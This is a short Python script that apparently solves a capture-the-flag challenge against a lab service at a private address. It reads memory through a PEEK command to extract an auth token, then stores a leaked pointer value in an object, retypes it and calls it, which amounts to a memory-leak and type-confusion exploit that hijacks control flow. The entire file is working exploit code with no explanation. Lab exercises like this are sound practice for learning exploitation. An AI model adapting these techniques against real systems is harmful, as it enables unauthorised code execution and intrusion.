import socket
import re
import sys

HOST_PORT = ("10.13.37.10", 20866)

def new_conn():
    s = socket.create_connection(HOST_PORT, timeout=8)
    s.settimeout(1.5)
    return s

def recv(s):
    buf = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

def get_auth1():
    s = new_conn()
    recv(s)
    s.sendall(b"PEEK 0 64\n")
    r = recv(s).decode(errors='replace')
    s.close()
    line = r.strip().splitlines()[-1]
    data = bytes.fromhex(line[5:])
    m = re.search(rb"CTF\{[^}]*\}", data)
    return m.group(0).decode()

AUTH1 = get_auth1()
print("auth1:", AUTH1, flush=True)

s = new_conn()
recv(s)

def cmd(c):
    s.sendall((c + "\n").encode())
    r = recv(s).decode(errors='replace').strip()
    print(">>>", c, flush=True)
    print("  ", r, flush=True)
    return r

cmd(f"AUTH1 {AUTH1}")
leaked = bytes.fromhex("107e271ab77b0000")
cmd("NEW 0")
payload = leaked + b"\x00" * (64 - len(leaked))
cmd("STORE 0 " + payload.hex())
cmd("RETYPE 0 1")
cmd("CALL 0")
s.close()
print("DONE", flush=True)
